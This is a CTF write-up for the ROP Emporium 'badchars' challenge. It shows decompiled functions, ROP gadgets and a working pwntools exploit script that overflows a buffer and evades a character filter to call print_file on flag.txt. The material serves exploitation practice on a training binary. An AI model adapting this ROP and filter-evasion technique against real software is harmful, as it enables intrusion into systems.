# badchars

## Reversing with Ghidva

### main
```c
int main() {
  pwnme();
  return 0;
}
```

### pwnme
```c
void pwnme() {
  int input_len;
  int i, j;
  char input[32];
  
  puts("badchars by ROP Emporium");
  puts("x86_64\n");
  memset(input, 0, 0x20);
  puts("badchars are: \'x\', \'g\', \'a\', \'.\'");
  printf("> ");
  input_len = read(0, input, 0x200);
  // If 'x', 'a', 'g' or '.' in input: replace them with -0x15
  for (i = 0; i < input_len; i = i + 1) {
    for (j = 0; j < 4; j = j + 1) {
      if (input[i] == "xga.badchars by ROP Emporium"[j]) {
        input[i] = -0x15;
      }
    }
  }
  puts("Thank you!");
}
```

### print_file
```c
void print_file(char *file_name) {
  char buf [40];
  FILE *file;
  
  file = 0;
  file = fopen(file_name, "r");
  if (file == 0) {
    printf("Failed to open file: %s\n", file_name);
    exit(1);
  }
  fgets(buf, 0x21, file);
  puts(buf);
  fclose(file);
}
```

## Target
The target is to call the function `print_file` with `flag.txt` as argument. But the binary checks our input and doesn't consents us to use some "bad chars": `['x', 'g', 'a', '.']`.

## The vuln

A `Buffer Overflow` allows us to perform a `ROP chain` attack using some useful gadgets.
Useful gadgets (using `ropper`):
```asm
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040062c: add byte ptr [r15], r14b; ret;
0x00000000004006a2: pop r15; ret;
0x00000000004006a3: pop rdi; ret;
0x0000000000400634: mov qword ptr [r13], r12; ret;
```
The first one and the last one allow us to perform arbitrary write in the same fashion as `write4`. The fourth one is to set the first parameter of a function. The second one consents us to add arbitrary integers to arbitrary memory spaces.

## The exploit
Using these gadgets, we can write into some writable memory space (e.g. `BSS`) the string `flag.txt` modified such that the badchars are decreased by 1. The correct char is then recovered using additions, re-adding one to the correct char.

The `add` instruction we need can be found in the `0x40062c` gadget.

## The script
```py
from pwn import *
import string
import os

def get_ns_offsets(s, badchars):
    news = ''.join([x if x not in badchars else chr(ord(x) - 1) for x in s])
    offsets = [s.index(x) for x in s if x in badchars]
    return news, offsets

#
# Context
#

badchars = ['x', 'g', 'a', '.']

e = context.binary = ELF("badchars")

#
# ROP
#

PRINT_FILE          = p64(e.plt['print_file'])

POP_R12_R13_R14_R15 = p64(next(e.search(asm('pop r12; pop r13; pop r14; pop r15; ret;'))))
ADD_DEREF_R15_R14B  = p64(next(e.search(asm('add byte ptr [r15], r14b; ret;'))))
MOV_DEREF_R13_R12   = p64(next(e.search(asm('mov qword ptr [r13], r12; ret; '))))
POP_R15             = p64(next(e.search(asm('pop r15; ret;'))))
POP_RDI             = p64(next(e.search(asm('pop rdi; ret;'))))

BSS_WRITE           = p64(e.bss(offset=0x200))

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x200, alphabet=string.digits))
io.wait()
core = io.corefile
io.close()

offset = cyclic_find(core.read(core.rsp, 4), alphabet=string.digits)

info(f'Offset: {offset}')

#
# Exploit
#

io = process(e.path)

newstring, offsets = get_ns_offsets('flag.txt', badchars)

info(f'flag.txt -> {newstring}')

payload  = b''
payload += b'A' * offset
payload += POP_R12_R13_R14_R15
payload += newstring.encode()
payload += BSS_WRITE
payload += p64(1)
payload += BSS_WRITE
payload += MOV_DEREF_R13_R12
for o in offsets:
    payload += POP_R15
    payload += p64(u64(BSS_WRITE) + o)
    payload += ADD_DEREF_R15_R14B
payload += POP_RDI
payload += BSS_WRITE
payload += PRINT_FILE

io.sendlineafter(b'> ', payload)

info(f'Flag: {io.recvrepeat(2).decode()}')

io.close()

os.system('rm core*')
```